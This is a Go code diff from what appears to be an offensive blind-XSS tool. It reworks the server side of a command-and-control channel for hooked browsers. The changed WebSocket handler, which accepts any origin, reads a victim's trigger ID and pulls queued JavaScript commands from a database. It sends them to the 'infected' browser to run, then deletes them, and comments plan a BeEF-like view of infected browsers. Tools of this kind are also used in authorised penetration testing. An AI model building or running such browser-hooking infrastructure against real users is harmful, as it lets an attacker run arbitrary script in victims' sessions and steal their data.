@@ -25,9 +25,9 @@ import (
 )
 
 var upgrader = websocket.Upgrader{
-    ReadBufferSize:  512,
-    WriteBufferSize: 512,
-	CheckOrigin: func(r *http.Request) bool { return true }, // should eventually fix this to loop over allowed origins, AKA, triggered hooks hosts. To only allow infected hosts to call back. true for true YOLOers
+	ReadBufferSize:  512,
+	WriteBufferSize: 512,
+	CheckOrigin:     func(r *http.Request) bool { return true }, // should eventually fix this to loop over allowed origins, AKA, triggered hooks hosts. To only allow infected hosts to call back. true for true YOLOers
 }
 
 func ServeXSS(currentFlags *core.Flags) (err error) {
@@ -106,6 +106,9 @@ func ServeXSS(currentFlags *core.Flags) (err error) {
 		server.TLSConfig = tlsConfig
 
 		err = server.ListenAndServeTLS("", "")
+		if err != nil {
+			return err
+		}
 	} else {
 		err = server.ListenAndServe()
 	}
@@ -114,7 +117,7 @@ func ServeXSS(currentFlags *core.Flags) (err error) {
 }
 
 func hookWSHandle(w http.ResponseWriter, r *http.Request) {
-	conn, err := upgrader.Upgrade(w, r, nil) // error ignored for sake of simplicity
+	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Println(err)
 	}
@@ -122,22 +125,49 @@ func hookWSHandle(w http.ResponseWriter, r *http.Request) {
 	//TODO: set online everytime we receive an heartbeat, if not heartbeat for more than X duration, its dead.
 	//TODO: also have a page for "infected browsers" instead of just triggers? Like beef?
 	//TODO: if same browser fingerprint matches, then reestablish existing connection?
+	//TODO: expose generic realtime communication channel for plugins
 	for {
 		// Read message from browser
 		msgType, msg, err := conn.ReadMessage()
 		if err != nil {
 			return
 		}
-		//TODO: get all commands in DB and send them over
-		// Print the message to the console
-		fmt.Printf("%s SENT %s\n", conn.RemoteAddr(), string(msg))
 
-		//fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), string(msg))
-
-		// Write message back to browser
-		if err = conn.WriteMessage(msgType, []byte("{\"commands\":[\"alert(1);\"]}")); err != nil {
+		var data core.PollRequestJSON
+		err = json.Unmarshal(msg, &data)
+		if err != nil {
 			return
 		}
+		if data.UID == "" {
+			continue
+		}
+
+		trigger := core.Trigger{UID: data.UID}
+
+		commands, err := database.GetCommandsForTrigger(&trigger)
+		if err != nil {
+			log.Println(err)
+			return
+		}
+		//log.Println("Current commands:", commands)
+		// TODO: get all commands in DB and send them over
+		// Print the message to the console
+		//fmt.Printf("%s SENT (%v) %s\n", conn.RemoteAddr(), msgType, string(msg))
+
+		//fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), string(msg))
+		jsonCommands, err := json.Marshal(commands)
+		if err != nil {
+			log.Println(err)
+			return
+		}
+
+		// Write message back to browser
+		if err = conn.WriteMessage(msgType, jsonCommands); err != nil {
+			return
+		}
+
+		//TODO: properly implement a way to check if command has been executed instead of deleting all SENT commands
+		database.DeleteTriggerCommands(&trigger)
 	}
 }
 
@@ -170,7 +200,7 @@ func hookHandle(w http.ResponseWriter, r *http.Request) {
 		log.Println("Failed to write response:", err)
 	}
 	return
-	
+
 }
 
 func blindHandle(w http.ResponseWriter, r *http.Request) {
